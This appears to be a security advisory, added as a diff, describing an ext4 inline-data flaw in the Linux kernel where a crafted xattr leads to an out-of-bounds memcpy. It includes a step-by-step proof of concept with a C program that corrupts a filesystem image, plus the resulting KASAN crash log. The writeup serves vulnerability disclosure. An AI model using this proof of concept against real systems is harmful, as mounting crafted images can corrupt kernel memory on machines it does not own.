@@ -1,0 +1,282 @@
+ext4 can store data for small regular files as "inline data", meaning that the
+data is stored inside the corresponding inode instead of in separate blocks.
+Inline data is stored in two places: The first 60 bytes go in the i_block field
+in the inode (which normally contains a list of blocks instead), the rest goes
+in the special filesystem-internal extended attribute "system.data".
+
+Since commit e50e5129f384 ("ext4: xattr-in-inode support", in v4.13+), ext4 can
+store extended attribute values not only inline in the inode, but can also store
+such values in dedicated inodes.
+
+When a corrupted filesystem stores the system.data extended attribute value in a
+dedicated inode, the kernel gets confused, causing memory corruption.
+
+
+
+ext4_find_inline_data_nolock() attempts to locate an inode's inline data by
+searching for the system.data xattr using ext4_xattr_ibody_find().
+If the inode has xattrs, ext4_xattr_ibody_find() first checks them for
+corruption using xattr_check_inode(), then grabs the wanted xattr using
+xattr_find_entry().
+xattr_check_inode() uses ext4_xattr_check_entries() to check the individual
+xattrs, but skips most checks if `entry->e_value_inum != 0` (marking an xattr
+whose value is in a dedicated inode) - only for inline values, length and offset
+checks are performed to ensure that the value actually fits into the inode.
+The problem is that ext4_find_inline_data_nolock() then assumes that the
+returned xattr uses inline storage and that the returned length will fit into
+the inode; it stores the length field from the xattr in
+`EXT4_I(inode)->i_inline_size` without further checks.
+
+Later, when the file is read, ext4_read_inline_data() trusts this length value,
+causing an out-of-bounds memcpy() in the following line:
+
+    memcpy(buffer,
+           (void *)IFIRST(header) + le16_to_cpu(entry->e_value_offs), len);
+
+
+
+To reproduce, on a system with kernel v4.13 or newer, ideally with KASAN on:
+
+1. Create a new ext4 filesystem image, with 256-byte inodes and inline data
+support:
+
+    $ mkfs.ext4 -b 4096 -I 256 -O inline_data testfs.img 400k
+    mke2fs 1.43.7 (16-Oct-2017)
+    Creating regular file testfs.img
+
+    Filesystem too small for a journal
+    Creating filesystem with 100 4k blocks and 64 inodes
+
+    Allocating group tables: done                            
+    Writing inode tables: done                            
+    Writing superblocks and filesystem accounting information: done
+
+2. Create a 75-byte file in the new filesystem:
+
+    $ mkdir mount
+    $ sudo mount testfs.img mount
+    $ sudo dd bs=75 count=1 if=/dev/zero of=mount/testfile
+    1+0 records in
+    1+0 records out
+    75 bytes copied, 0.000811554 s, 92.4 kB/s
+    $ sudo umount mount
+
+3. Bump up the inode size, bump up the xattr size, and mark the xattr value as
+   non-inline:
+
+    $ cat fixup.c
+    #include <stdint.h>
+    #include <fcntl.h>
+    #include <err.h>
+    #include <stdio.h>
+    #include <stdlib.h>
+    #include <sys/mman.h>
+    #include <sys/stat.h>
+
+    #define __le16 uint16_t
+    #define __le32 uint32_t
+    #define __u16 uint16_t
+    #define __u32 uint32_t
+    #define __u8 uint8_t
+
+    /* some definitions from kernel headers */
+    #define EXT4_NDIR_BLOCKS    12
+    #define EXT4_IND_BLOCK      EXT4_NDIR_BLOCKS
+    #define EXT4_DIND_BLOCK     (EXT4_IND_BLOCK + 1)
+    #define EXT4_TIND_BLOCK     (EXT4_DIND_BLOCK + 1)
+    #define EXT4_N_BLOCKS       (EXT4_TIND_BLOCK + 1)
+    #define EXT4_XATTR_MAGIC    0xEA020000
+    struct ext4_inode {
+      __le16  i_mode;
+      __le16  i_uid;
+      __le32  i_size_lo;
+      __le32  i_atime;
+      __le32  i_ctime;
+      __le32  i_mtime;
+      __le32  i_dtime;
+      __le16  i_gid;
+      __le16  i_links_count;
+      __le32  i_blocks_lo;
+      __le32  i_flags;
+      union {
+        struct {
+          __le32  l_i_version;
+        } linux1;
+      } osd1;
+      __le32  i_block[EXT4_N_BLOCKS];
+      __le32  i_generation;
+      __le32  i_file_acl_lo;
+      __le32  i_size_high;
+      __le32  i_obso_faddr;
+      union {
+        struct {
+          __le16  l_i_blocks_high;
+          __le16  l_i_file_acl_high;
+          __le16  l_i_uid_high;
+          __le16  l_i_gid_high;
+          __le16  l_i_checksum_lo;
+          __le16  l_i_reserved;
+        } linux2;
+      } osd2;
+      __le16  i_extra_isize;
+      __le16  i_checksum_hi;
+      __le32  i_ctime_extra;
+      __le32  i_mtime_extra;
+      __le32  i_atime_extra;
+      __le32  i_crtime;
+      __le32  i_crtime_extra;
+      __le32  i_version_hi;
+      __le32  i_projid;
+    };
+    struct ext4_xattr_ibody_header {
+      __le32  h_magic;
+    };
+    struct ext4_xattr_entry {
+      __u8  e_name_len;
+      __u8  e_name_index;
+      __le16  e_value_offs;
+      __le32  e_value_inum;
+      __le32  e_value_size;
+      __le32  e_hash;
+      char  e_name[0];
+    };
+
+    #define INODE_SIZE 256
+
+    #define ROUND_UP(x,round) ( ((x)+((round)-1)) & ~((round)-1) )
+
+    int main(int argc, char **argv) {
+      char *path = argv[1];
+      int fd = open(path, O_RDWR);
+      if (fd == -1) err(1, "open");
+      struct stat st;
+      if (fstat(fd, &st)) err(1, "fstat");
+      char *map = mmap(NULL, st.st_size, PROT_READ|PROT_WRITE, MAP_SHARED, fd, 0);
+      if (map == MAP_FAILED) err(1, "mmap");
+      for (int i=0; i<st.st_size/INODE_SIZE; i++) {
+        struct ext4_inode *ino = (void*)(map + i * INODE_SIZE);
+        if (ino->i_links_count != 1 || ino->i_size_lo != 75) continue;
+        printf("found inode (idx=%d, size=%u, mode=%ho)\n",
+               i, ino->i_size_lo, ino->i_mode);
+        ino->i_size_lo = 60000;
+        printf("  i_extra_isize = %hu\n", ino->i_extra_isize);
+        struct ext4_xattr_ibody_header *hdr =
+            (void*)( ((char*)ino)+128+ino->i_extra_isize );
+        if (hdr->h_magic != EXT4_XATTR_MAGIC) continue;
+        struct ext4_xattr_entry *entry = (void*)(hdr+1);
+        while (*(uint32_t*)entry != 0) {
+          printf("  attr: idx=%hhu name='%*s' offs=%hu inum=%u size=%u\n",
+              entry->e_name_index, entry->e_name_len, entry->e_name,
+              entry->e_value_offs, entry->e_value_inum, entry->e_value_size);
+          entry->e_value_offs = 0;
+          entry->e_value_inum = 20;
+          entry->e_value_size = 60000;
+          entry = (void*)(
+              (char*)entry + sizeof(*entry) + ROUND_UP(entry->e_name_len, 4)
+          );
+        }
+      }
+    }
+    $ gcc -o fixup fixup.c -Wall
+    $ ./fixup testfs.img
+    found inode (idx=555, size=75, mode=100644)
+      i_extra_isize = 32
+      attr: idx=7 name='data' offs=76 inum=0 size=15
+
+4. Use fsck to fix up the inode checksum (but don't let it fix anything else!):
+
+    $ fsck.ext4 -f testfs.img
+    e2fsck 1.43.7 (16-Oct-2017)
+    Pass 1: Checking inodes, blocks, and sizes
+    Inode 12 has INLINE_DATA_FL flag but extended attribute not found.  Truncate<y>? no
+    Extended attribute in inode 12 has a value size (60000) which is invalid
+    Clear<y>? no
+    Inode 12 passes checks, but checksum does not match inode.  Fix<y>? yes
+    Pass 2: Checking directory structure
+    Pass 3: Checking directory connectivity
+    Pass 4: Checking reference counts
+    Pass 5: Checking group summary information
+
+    testfs.img: ***** FILE SYSTEM WAS MODIFIED *****
+
+    testfs.img: ********** WARNING: Filesystem still has errors **********
+
+    testfs.img: 12/64 files (0.0% non-contiguous), 13/100 blocks
+
+5. Mount the filesystem again:
+
+    $ sudo mount testfs.img mount
+
+6. Read the file:
+
+    $ hexdump -C mount/testfile
+    00000000  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
+    *
+    00000030  00 00 00 00 00 00 00 00  00 00 00 00 04 07 00 00  |................|
+    00000040  14 00 00 00 60 ea 00 00  00 00 00 00 64 61 74 61  |....`.......data|
+    00000050  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
+    *
+    000004a0  31 00 00 00 00 00 00 00  e0 d1 fc 98 d7 7f 00 00  |1...............|
+    000004b0  e0 07 03 99 d7 7f 00 00  00 00 00 00 00 00 00 00  |................|
+    000004c0  00 00 00 00 00 00 00 00  e0 5f 00 00 00 00 00 00  |........._......|
+    000004d0  64 00 00 00 00 00 00 00  f0 af 02 99 d7 7f 00 00  |d...............|
+    000004e0  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
+    [...]
+
+7. Check dmesg:
+
+    $ dmesg
+    [...]
+    [ 3211.552729] ==================================================================
+    [ 3211.552782] BUG: KASAN: use-after-free in ext4_read_inline_data+0x114/0x120 [ext4]
+    [ 3211.552787] Write of size 59940 at addr ffff8802ba1d003c by task pool/12922
+
+    [ 3211.552796] CPU: 3 PID: 12922 Comm: pool Not tainted 4.17.0-rc4+ #7
+    [ 3211.552798] Hardware name: LENOVO 20FCS12V06/20FCS12V06, BIOS N1FET43W (1.17 ) 08/02/2016
+    [ 3211.552799] Call Trace:
+    [ 3211.552807]  dump_stack+0x71/0xab
+    [ 3211.552813]  print_address_description+0x6a/0x250
+    [ 3211.552817]  kasan_report+0x258/0x380
+    [ 3211.552863]  ? ext4_read_inline_data+0x114/0x120 [ext4]
+    [ 3211.552867]  memcpy+0x34/0x50
+    [ 3211.552914]  ext4_read_inline_data+0x114/0x120 [ext4]
+    [ 3211.552961]  ext4_read_inline_page+0x1e4/0x2a0 [ext4]
+    [ 3211.553006]  ? ext4_read_inline_data+0x120/0x120 [ext4]
+    [ 3211.553053]  ext4_readpage_inline+0x13e/0x160 [ext4]
+    [ 3211.553101]  ext4_readpage+0xf5/0x110 [ext4]
+    [ 3211.553106]  generic_file_read_iter+0x9a4/0xea0
+    [ 3211.553112]  ? filemap_range_has_page+0x160/0x160
+    [ 3211.553116]  ? save_stack+0x89/0xb0
+    [ 3211.553120]  ? __kasan_slab_free+0x105/0x150
+    [ 3211.553124]  ? aa_path_link+0x1f0/0x1f0
+    [ 3211.553128]  ? do_syscall_64+0x150/0x160
+    [ 3211.553132]  ? entry_SYSCALL_64_after_hwframe+0x44/0xa9
+    [ 3211.553137]  ? audit_watch_compare+0x1b/0x50
+    [ 3211.553142]  __vfs_read+0x239/0x340
+    [ 3211.553145]  ? __x64_sys_copy_file_range+0x2d0/0x2d0
+    [ 3211.553149]  ? dput.part.19+0x2e/0x1b0
+    [ 3211.553154]  ? auditd_test_task+0x43/0x60
+    [ 3211.553158]  vfs_read+0xa5/0x190
+    [ 3211.553162]  ksys_read+0xa1/0x120
+    [ 3211.553166]  ? kernel_write+0xa0/0xa0
+    [ 3211.553171]  do_syscall_64+0x6d/0x160
+    [ 3211.553175]  entry_SYSCALL_64_after_hwframe+0x44/0xa9
+    [ 3211.553178] RIP: 0033:0x7f9ada1af72c
+    [ 3211.553180] RSP: 002b:00007f9ac2258888 EFLAGS: 00000246 ORIG_RAX: 0000000000000000
+    [...]
+    [ 3211.553197] The buggy address belongs to the page:
+    [ 3211.553202] page:ffffea000ae87400 count:2 mapcount:0 mapping:ffff88021fe57898 index:0x0
+    [ 3211.553207] flags: 0x17fffc000000021(locked|lru)
+    [ 3211.553213] raw: 017fffc000000021 ffff88021fe57898 0000000000000000 00000002ffffffff
+    [ 3211.553219] raw: ffffea000858fc20 ffff8803d0a204a0 0000000000000000 ffff8803cf31cac0
+    [ 3211.553222] page dumped because: kasan: bad access detected
+    [ 3211.553224] page->mem_cgroup:ffff8803cf31cac0
+
+    [ 3211.553229] Memory state around the buggy address:
+    [ 3211.553234]  ffff8802ba1d0f00: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+    [ 3211.553238]  ffff8802ba1d0f80: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+    [ 3211.553243] >ffff8802ba1d1000: ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff
+    [ 3211.553246]                    ^
+    [ 3211.553250]  ffff8802ba1d1080: ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff
+    [ 3211.553254]  ffff8802ba1d1100: ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff
+    [ 3211.553257] ==================================================================
